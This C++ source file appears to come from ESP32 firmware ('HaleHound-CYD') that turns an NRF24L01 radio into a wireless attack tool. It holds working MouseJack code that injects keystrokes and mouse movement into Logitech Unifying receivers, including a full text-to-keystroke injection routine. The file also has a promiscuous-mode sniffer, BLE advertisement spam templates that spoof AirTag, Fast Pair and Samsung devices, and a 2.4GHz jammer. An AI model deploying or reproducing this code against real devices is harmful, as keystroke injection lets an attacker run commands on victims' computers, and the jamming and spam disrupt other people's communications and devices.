// ═══════════════════════════════════════════════════════════════════════════
// HaleHound-CYD NRF24L01+PA+LNA Implementation
// 2.4GHz Radio for Mouse Jacker, BLE Spam, and Wireless Attacks
// Created: 2026-02-06
// ═══════════════════════════════════════════════════════════════════════════

#include "nrf24_config.h"
#include "shared.h"
#include <ELECHOUSE_CC1101_SRC_DRV.h>

// ═══════════════════════════════════════════════════════════════════════════
// GLOBAL OBJECTS
// ═══════════════════════════════════════════════════════════════════════════

RF24 nrf24Radio(NRF24_CE, NRF24_CSN, 4000000);  // 4MHz SPI — ESP32+PA/LNA needs ≤4MHz (RF24 #992)
NRF24Mode currentNRF24Mode = NRF24_MODE_OFF;
uint8_t mouseJackerTarget[5] = {0, 0, 0, 0, 0};
uint8_t mouseJackerChannel = 0;
uint8_t mouseJackerDeviceType = 0;

static bool nrf24Active = false;
static bool spiClaimed = false;

// ═══════════════════════════════════════════════════════════════════════════
// SPI BUS MANAGEMENT
// ═══════════════════════════════════════════════════════════════════════════

void nrf24ClaimSPI() {
    if (spiClaimed) return;

    // Make sure CC1101 is not using the bus
    #ifndef NMRF_HAT
    // Standard CYD: CC1101 CS (GPIO 27) is separate — safe to send setSidle
    // Hat: CC1101_CS == NRF24_CSN == GPIO 27 — setSidle would corrupt NRF24
    ELECHOUSE_cc1101.setSidle();
    #endif

    // If E07 PA module, set both PA control pins LOW (idle) before NRF24 takes SPI
    #if defined(CC1101_TX_EN) && defined(CC1101_RX_EN)
    if (cc1101_pa_module) {
        digitalWrite(CC1101_TX_EN, LOW);
        digitalWrite(CC1101_RX_EN, LOW);
    }
    #endif

    // Initialize SPI for NRF24
    SPI.end();
    SPI.begin(RADIO_SPI_SCK, RADIO_SPI_MISO, RADIO_SPI_MOSI, NRF24_CSN);

    spiClaimed = true;

    #if CYD_DEBUG
    Serial.println("[NRF24] SPI bus claimed");
    #endif
}

void nrf24ReleaseSPI() {
    if (!spiClaimed) return;

    // Power down NRF24
    nrf24Radio.powerDown();

    // Re-initialize SPI for CC1101
    SPI.end();
    SPI.begin(RADIO_SPI_SCK, RADIO_SPI_MISO, RADIO_SPI_MOSI, CC1101_CS);

    spiClaimed = false;

    #if CYD_DEBUG
    Serial.println("[NRF24] SPI bus released");
    #endif
}

// ═══════════════════════════════════════════════════════════════════════════
// INITIALIZATION
// ═══════════════════════════════════════════════════════════════════════════

bool nrf24Setup() {
    #if CYD_DEBUG
    Serial.println("[NRF24] Initializing...");
    Serial.println("  CE:  GPIO " + String(NRF24_CE));
    Serial.println("  CSN: GPIO " + String(NRF24_CSN));
    #endif

    nrf24ClaimSPI();
    delay(150);  // Power supply settling — PA/LNA modules need time after SPI init

    if (!nrf24Radio.begin()) {
        #if CYD_DEBUG
        Serial.println("[NRF24] ERROR: Failed to initialize!");
        #endif
        nrf24ReleaseSPI();
        return false;
    }

    if (!nrf24Radio.isChipConnected()) {
        #if CYD_DEBUG
        Serial.println("[NRF24] ERROR: Chip not connected!");
        #endif
        nrf24ReleaseSPI();
        return false;
    }

    // Default configuration
    nrf24Radio.setPALevel(RF24_PA_MAX);
    nrf24Radio.setDataRate(RF24_1MBPS);
    nrf24Radio.setChannel(76);
    nrf24Radio.setAutoAck(false);
    nrf24Radio.disableCRC();

    nrf24Active = true;
    currentNRF24Mode = NRF24_MODE_OFF;

    #if CYD_DEBUG
    Serial.println("[NRF24] Initialized successfully");
    Serial.println("  Variant: " + String(nrf24Radio.isPVariant() ? "+PA+LNA" : "Standard"));
    #endif

    return true;
}

void nrf24Shutdown() {
    if (!nrf24Active) return;

    nrf24Radio.powerDown();
    nrf24ReleaseSPI();

    nrf24Active = false;
    currentNRF24Mode = NRF24_MODE_OFF;

    #if CYD_DEBUG
    Serial.println("[NRF24] Shutdown complete");
    #endif
}

bool nrf24IsActive() {
    return nrf24Active;
}

// ═══════════════════════════════════════════════════════════════════════════
// CHANNEL SCANNER
// ═══════════════════════════════════════════════════════════════════════════

void nrf24ScanChannels(uint8_t* results) {
    if (!nrf24Active) {
        nrf24Setup();
    }

    currentNRF24Mode = NRF24_MODE_SCANNER;

    // Set up for scanning
    nrf24Radio.setAutoAck(false);
    nrf24Radio.startListening();

    // Scan all 126 channels
    for (int ch = 0; ch < 126; ch++) {
        nrf24Radio.setChannel(ch);
        delayMicroseconds(130);  // Settling time

        // Sample multiple times
        int count = 0;
        for (int i = 0; i < 100; i++) {
            if (nrf24Radio.testRPD()) {
                count++;
            }
            delayMicroseconds(50);
        }

        results[ch] = count;
    }

    nrf24Radio.stopListening();

    #if CYD_DEBUG
    Serial.println("[NRF24] Channel scan complete");
    #endif
}

uint8_t nrf24GetBusiestChannel() {
    uint8_t results[126];
    nrf24ScanChannels(results);

    uint8_t maxChannel = 0;
    uint8_t maxValue = 0;

    for (int i = 0; i < 126; i++) {
        if (results[i] > maxValue) {
            maxValue = results[i];
            maxChannel = i;
        }
    }

    return maxChannel;
}

// ═══════════════════════════════════════════════════════════════════════════
// MOUSE JACKER
// ═══════════════════════════════════════════════════════════════════════════

bool nrf24InjectMouseMove(int8_t x, int8_t y) {
    if (!nrf24Active || currentNRF24Mode != NRF24_MODE_MOUSEJACKER) {
        return false;
    }

    // Logitech mouse packet format
    uint8_t packet[10] = {0};
    packet[0] = 0x00;  // Device type: mouse
    packet[1] = 0xC2;  // Movement report
    packet[2] = 0x00;  // Buttons
    packet[3] = x;     // X movement
    packet[4] = y;     // Y movement
    packet[5] = 0x00;  // Wheel

    nrf24Radio.stopListening();
    nrf24Radio.openWritingPipe(mouseJackerTarget);

    bool success = nrf24Radio.write(packet, 10);

    #if CYD_DEBUG
    if (success) {
        Serial.println("[NRF24] Mouse move injected: X=" + String(x) + " Y=" + String(y));
    }
    #endif

    return success;
}

bool nrf24InjectKeystroke(uint8_t key, uint8_t modifiers) {
    if (!nrf24Active || currentNRF24Mode != NRF24_MODE_MOUSEJACKER) {
        return false;
    }

    // Logitech Unifying keyboard packet format (10 bytes)
    // Ref: Bastille Research MouseJack, nRF24-Playset (Sysenter-EIP)
    uint8_t packet[10] = {0};
    packet[0] = 0x00;      // HID++ device index (keyboard = 0)
    packet[1] = 0xC1;      // Frame type: keyboard report (was 0xD3 — WRONG)
    packet[2] = modifiers;  // HID modifier byte
    packet[3] = 0x00;      // Reserved
    packet[4] = key;       // HID usage code
    packet[5] = 0x00;      // Key 2
    packet[6] = 0x00;      // Key 3
    packet[7] = 0x00;      // Key 4
    packet[8] = 0x00;      // Key 5

    // Logitech LRC checksum: XOR of bytes 0-8
    uint8_t lrc = 0;
    for (int i = 0; i < 9; i++) lrc ^= packet[i];
    packet[9] = lrc;

    // Configure radio for Logitech Unifying injection
    nrf24Radio.stopListening();
    nrf24Radio.setAutoAck(false);
    nrf24Radio.setDataRate(RF24_2MBPS);
    nrf24Radio.setCRCLength(RF24_CRC_16);   // Logitech requires 16-bit CRC
    nrf24Radio.setPALevel(RF24_PA_MAX);
    nrf24Radio.setPayloadSize(10);
    nrf24Radio.openWritingPipe(mouseJackerTarget);

    bool success = nrf24Radio.write(packet, 10);

    // Send key release (bytes 2-8 = 0x00)
    delay(5);
    packet[2] = 0x00;
    packet[4] = 0x00;
    // Recalculate LRC for release packet
    lrc = 0;
    for (int i = 0; i < 9; i++) lrc ^= packet[i];
    packet[9] = lrc;
    nrf24Radio.write(packet, 10);

    #if CYD_DEBUG
    if (success) {
        Serial.println("[NRF24] Keystroke injected: 0x" + String(key, HEX));
    }
    #endif

    return success;
}

bool nrf24InjectString(const char* str) {
    // Full HID scancode map — covers a-z, A-Z, 0-9, symbols, special keys
    // Ref: USB HID Usage Tables (Keyboard/Keypad Page 0x07)
    while (*str) {
        char c = *str++;
        uint8_t key = 0;
        uint8_t mod = 0;

        if (c >= 'a' && c <= 'z') {
            key = 0x04 + (c - 'a');         // a=0x04 .. z=0x1D
        } else if (c >= 'A' && c <= 'Z') {
            key = 0x04 + (c - 'A');
            mod = 0x02;                      // Left Shift
        } else if (c >= '1' && c <= '9') {
            key = 0x1E + (c - '1');         // 1=0x1E .. 9=0x26
        } else if (c == '0') {
            key = 0x27;
        } else {
            // Symbols and special characters
            switch (c) {
                case ' ':  key = 0x2C; break;           // Space
                case '\n': key = 0x28; break;           // Enter
                case '\t': key = 0x2B; break;           // Tab
                case '\b': key = 0x2A; break;           // Backspace
                case '-':  key = 0x2D; break;
                case '=':  key = 0x2E; break;
                case '[':  key = 0x2F; break;
                case ']':  key = 0x30; break;
                case '\\': key = 0x31; break;
                case ';':  key = 0x33; break;
                case '\'': key = 0x34; break;
                case '`':  key = 0x35; break;
                case ',':  key = 0x36; break;
                case '.':  key = 0x37; break;
                case '/':  key = 0x38; break;
                // Shifted symbols
                case '!':  key = 0x1E; mod = 0x02; break;  // Shift+1
                case '@':  key = 0x1F; mod = 0x02; break;  // Shift+2
                case '#':  key = 0x20; mod = 0x02; break;  // Shift+3
                case '$':  key = 0x21; mod = 0x02; break;  // Shift+4
                case '%':  key = 0x22; mod = 0x02; break;  // Shift+5
                case '^':  key = 0x23; mod = 0x02; break;  // Shift+6
                case '&':  key = 0x24; mod = 0x02; break;  // Shift+7
                case '*':  key = 0x25; mod = 0x02; break;  // Shift+8
                case '(':  key = 0x26; mod = 0x02; break;  // Shift+9
                case ')':  key = 0x27; mod = 0x02; break;  // Shift+0
                case '_':  key = 0x2D; mod = 0x02; break;  // Shift+-
                case '+':  key = 0x2E; mod = 0x02; break;  // Shift+=
                case '{':  key = 0x2F; mod = 0x02; break;  // Shift+[
                case '}':  key = 0x30; mod = 0x02; break;  // Shift+]
                case '|':  key = 0x31; mod = 0x02; break;  // Shift+backslash
                case ':':  key = 0x33; mod = 0x02; break;  // Shift+;
                case '"':  key = 0x34; mod = 0x02; break;  // Shift+'
                case '~':  key = 0x35; mod = 0x02; break;  // Shift+`
                case '<':  key = 0x36; mod = 0x02; break;  // Shift+,
                case '>':  key = 0x37; mod = 0x02; break;  // Shift+.
                case '?':  key = 0x38; mod = 0x02; break;  // Shift+/
                default:   continue;  // Skip unsupported chars
            }
        }

        if (key) {
            nrf24InjectKeystroke(key, mod);
            delay(10);  // 10ms between keystrokes for reliable injection
        }
    }

    return true;
}

// ═══════════════════════════════════════════════════════════════════════════
// PROMISCUOUS MODE (Travis Goodspeed technique)
// Ref: "Promiscuity is the nRF24L01+" (2011), Keykeriki v2.0
// Uses illegal 2-byte address width (SETUP_AW=0x00) to capture raw 2.4GHz
// ═══════════════════════════════════════════════════════════════════════════

// NRF24 register addresses for raw SPI access
#define _PROMISC_CONFIG      0x00
#define _PROMISC_EN_AA       0x01
#define _PROMISC_EN_RXADDR   0x02
#define _PROMISC_SETUP_AW    0x03
#define _PROMISC_RF_CH       0x05
#define _PROMISC_RF_SETUP    0x06
#define _PROMISC_STATUS      0x07
#define _PROMISC_RX_PW_P0    0x11
#define _PROMISC_RX_PW_P1    0x12
#define _PROMISC_RX_ADDR_P0  0x0A
#define _PROMISC_RX_ADDR_P1  0x0B
#define _PROMISC_FIFO_STATUS 0x17
#define _PROMISC_FLUSH_RX    0xE2
#define _PROMISC_R_RX_PAYLOAD 0x61

static bool promiscActive = false;

static void promiscWriteReg(uint8_t reg, uint8_t val) {
    digitalWrite(NRF24_CSN, LOW);
    SPI.transfer((reg & 0x1F) | 0x20);
    SPI.transfer(val);
    digitalWrite(NRF24_CSN, HIGH);
}

static uint8_t promiscReadReg(uint8_t reg) {
    uint8_t val;
    digitalWrite(NRF24_CSN, LOW);
    SPI.transfer(reg & 0x1F);
    val = SPI.transfer(0);
    digitalWrite(NRF24_CSN, HIGH);
    return val;
}

static void promiscWriteRegMulti(uint8_t reg, const uint8_t* data, uint8_t len) {
    digitalWrite(NRF24_CSN, LOW);
    SPI.transfer((reg & 0x1F) | 0x20);
    for (uint8_t i = 0; i < len; i++) SPI.transfer(data[i]);
    digitalWrite(NRF24_CSN, HIGH);
}

static void promiscFlushRx() {
    digitalWrite(NRF24_CSN, LOW);
    SPI.transfer(_PROMISC_FLUSH_RX);
    digitalWrite(NRF24_CSN, HIGH);
}

bool nrf24SetPromiscuous() {
    if (!nrf24Active) {
        if (!nrf24Setup()) return false;
    }

    // Power down RF24 library's control — we go raw SPI from here
    nrf24Radio.powerDown();

    // CE LOW during config
    digitalWrite(NRF24_CE, LOW);

    // SETUP_AW = 0x00: illegal 2-byte address width (Goodspeed trick)
    // RF24 library clamps minimum to 3 bytes — must bypass it
    promiscWriteReg(_PROMISC_SETUP_AW, 0x00);

    // Disable auto-ack on all pipes
    promiscWriteReg(_PROMISC_EN_AA, 0x00);

    // Enable RX on pipes 0 and 1
    promiscWriteReg(_PROMISC_EN_RXADDR, 0x03);

    // RF setup: 2Mbps, -6dBm (wider capture bandwidth, less noise than MAX)
    promiscWriteReg(_PROMISC_RF_SETUP, 0x09);

    // Set 2-byte RX addresses for preamble matching
    // 0xAA preamble → after dewhitening gives 0x55,0x55 pattern
    const uint8_t addr0[] = {0xAA, 0x55};
    const uint8_t addr1[] = {0x55, 0xAA};
    promiscWriteRegMulti(_PROMISC_RX_ADDR_P0, addr0, 2);
    promiscWriteRegMulti(_PROMISC_RX_ADDR_P1, addr1, 2);

    // Set payload width to 32 bytes (maximum)
    promiscWriteReg(_PROMISC_RX_PW_P0, 32);
    promiscWriteReg(_PROMISC_RX_PW_P1, 32);

    // Flush RX FIFO
    promiscFlushRx();

    // Clear all IRQ flags
    promiscWriteReg(_PROMISC_STATUS, 0x70);

    // Power up in RX mode, CRC disabled
    // CONFIG = PWR_UP | PRIM_RX = 0x03, no CRC bits
    promiscWriteReg(_PROMISC_CONFIG, 0x03);
    delayMicroseconds(1500);  // Tpd2stby

    // CE HIGH to start receiving
    digitalWrite(NRF24_CE, HIGH);
    delayMicroseconds(130);

    promiscActive = true;
    currentNRF24Mode = NRF24_MODE_SNIFFER;

    #if CYD_DEBUG
    Serial.println("[NRF24] Promiscuous mode active (Goodspeed 2-byte AW)");
    #endif

    return true;
}

void nrf24ExitPromiscuous() {
    if (!promiscActive) return;

    // CE LOW, power down
    digitalWrite(NRF24_CE, LOW);
    promiscWriteReg(_PROMISC_CONFIG, 0x00);

    promiscActive = false;
    currentNRF24Mode = NRF24_MODE_OFF;

    // Restore RF24 library control — re-init with normal settings
    nrf24Radio.begin();
    nrf24Radio.setPALevel(RF24_PA_MAX);
    nrf24Radio.setDataRate(RF24_1MBPS);
    nrf24Radio.setChannel(76);
    nrf24Radio.setAutoAck(false);
    nrf24Radio.disableCRC();

    #if CYD_DEBUG
    Serial.println("[NRF24] Promiscuous mode exited, RF24 library restored");
    #endif
}

int nrf24ReadRawPacket(uint8_t* buf, uint8_t maxLen) {
    if (!promiscActive) return 0;

    // Check FIFO status
    uint8_t fifoStatus = promiscReadReg(_PROMISC_FIFO_STATUS);
    if (fifoStatus & 0x01) return 0;  // RX FIFO empty

    // Read payload
    uint8_t readLen = (maxLen < 32) ? maxLen : 32;
    digitalWrite(NRF24_CSN, LOW);
    SPI.transfer(_PROMISC_R_RX_PAYLOAD);
    for (uint8_t i = 0; i < readLen; i++) {
        buf[i] = SPI.transfer(0);
    }
    digitalWrite(NRF24_CSN, HIGH);

    // Clear RX_DR flag
    promiscWriteReg(_PROMISC_STATUS, 0x40);

    return readLen;
}

// ═══════════════════════════════════════════════════════════════════════════
// BLE SPAM
// ═══════════════════════════════════════════════════════════════════════════

// BLE advertising channels (37, 38, 39 in BLE = 2, 26, 80 in NRF24)
static const uint8_t bleChannels[] = {2, 26, 80};
static bool bleSpamActive = false;
static BLESpamType currentBLESpamType = BLE_SPAM_RANDOM;

// AirTag advertisement template
static uint8_t airtag_data[] = {
    0x1E, 0xFF, 0x4C, 0x00, 0x12, 0x19, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

// Android Fast Pair template
static uint8_t fastpair_data[] = {
    0x03, 0x03, 0x2C, 0xFE,  // Service data
    0x06, 0x16, 0x2C, 0xFE,
    0x00, 0x00, 0x00         // Model ID (randomized)
};

// Samsung template
static uint8_t samsung_data[] = {
    0x02, 0x01, 0x06,
    0x1B, 0xFF, 0x75, 0x00,  // Samsung manufacturer ID
    0x42, 0x09, 0x81, 0x02,
    0x14, 0x15, 0x03, 0x21,
    0x01, 0x09, 0xEF, 0x00,
    0x00, 0x00, 0x00, 0x00
};

void nrf24StartBLESpam(BLESpamType type) {
    if (!nrf24Active) {
        nrf24Setup();
    }

    currentNRF24Mode = NRF24_MODE_BLE_SPAM;
    currentBLESpamType = type;
    bleSpamActive = true;

    // Configure for BLE
    nrf24Radio.setAutoAck(false);
    nrf24Radio.setPayloadSize(32);
    nrf24Radio.setDataRate(RF24_1MBPS);
    nrf24Radio.disableCRC();
    nrf24Radio.setPALevel(RF24_PA_MAX);
    nrf24Radio.stopListening();

    #if CYD_DEBUG
    Serial.println("[NRF24] BLE spam started: type " + String(type));
    #endif
}

void nrf24StopBLESpam() {
    bleSpamActive = false;
    currentNRF24Mode = NRF24_MODE_OFF;

    #if CYD_DEBUG
    Serial.println("[NRF24] BLE spam stopped");
    #endif
}

void nrf24SendBLEAdvert(uint8_t* data, uint8_t len) {
    if (!bleSpamActive) return;

    // Cycle through BLE advertising channels
    for (int i = 0; i < 3; i++) {
        nrf24Radio.setChannel(bleChannels[i]);

        // BLE uses specific preamble and access address
        uint8_t packet[32];
        packet[0] = 0xD6;  // BLE preamble byte (for 1Mbps)
        packet[1] = 0xBE;  // Access address
        packet[2] = 0x89;
        packet[3] = 0x8E;
        packet[4] = 0x8E;

        // Copy advertising data
        memcpy(&packet[5], data, min((int)len, 27));

        nrf24Radio.write(packet, min((int)len + 5, 32));
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// 2.4GHz JAMMER
// ═══════════════════════════════════════════════════════════════════════════

static bool jammerActive = false;
static uint8_t jammerChannel = 0xFF;

void nrf24StartJammer(uint8_t channel) {
    if (!nrf24Active) {
        nrf24Setup();
    }

    currentNRF24Mode = NRF24_MODE_JAMMER;
    jammerActive = true;
    jammerChannel = channel;

    nrf24Radio.stopListening();
    nrf24Radio.setPALevel(RF24_PA_MAX);
    nrf24Radio.setDataRate(RF24_2MBPS);
    nrf24Radio.setAutoAck(false);
    nrf24Radio.setPayloadSize(32);

    if (channel != 0xFF) {
        nrf24Radio.setChannel(channel);
    }

    #if CYD_DEBUG
    Serial.println("[NRF24] Jammer started on channel " + String(channel == 0xFF ? "ALL" : String(channel)));
    #endif
}

void nrf24StopJammer() {
    jammerActive = false;
    currentNRF24Mode = NRF24_MODE_OFF;

    #if CYD_DEBUG
    Serial.println("[NRF24] Jammer stopped");
    #endif
}

// ═══════════════════════════════════════════════════════════════════════════
// UTILITIES
// ═══════════════════════════════════════════════════════════════════════════

void nrf24SetChannel(uint8_t channel) {
    if (channel > 125) channel = 125;
    nrf24Radio.setChannel(channel);
}

void nrf24SetPower(rf24_pa_dbm_e level) {
    nrf24Radio.setPALevel(level);
}

void nrf24SetDataRate(rf24_datarate_e rate) {
    nrf24Radio.setDataRate(rate);
}

uint8_t nrf24GetChannel() {
    return nrf24Radio.getChannel();
}

bool nrf24IsPALNA() {
    return nrf24Radio.isPVariant();
}

void nrf24PrintStatus() {
    #if CYD_DEBUG
    Serial.println("═══════════════════════════════════════");
    Serial.println("         NRF24 STATUS");
    Serial.println("═══════════════════════════════════════");
    Serial.println("Active:     " + String(nrf24Active ? "YES" : "NO"));
    Serial.println("Mode:       " + String(currentNRF24Mode));
    Serial.println("Variant:    " + String(nrf24IsPALNA() ? "+PA+LNA" : "Standard"));
    Serial.println("Channel:    " + String(nrf24GetChannel()));
    Serial.println("SPI Claimed:" + String(spiClaimed ? "YES" : "NO"));
    Serial.println("═══════════════════════════════════════");
    #endif
}
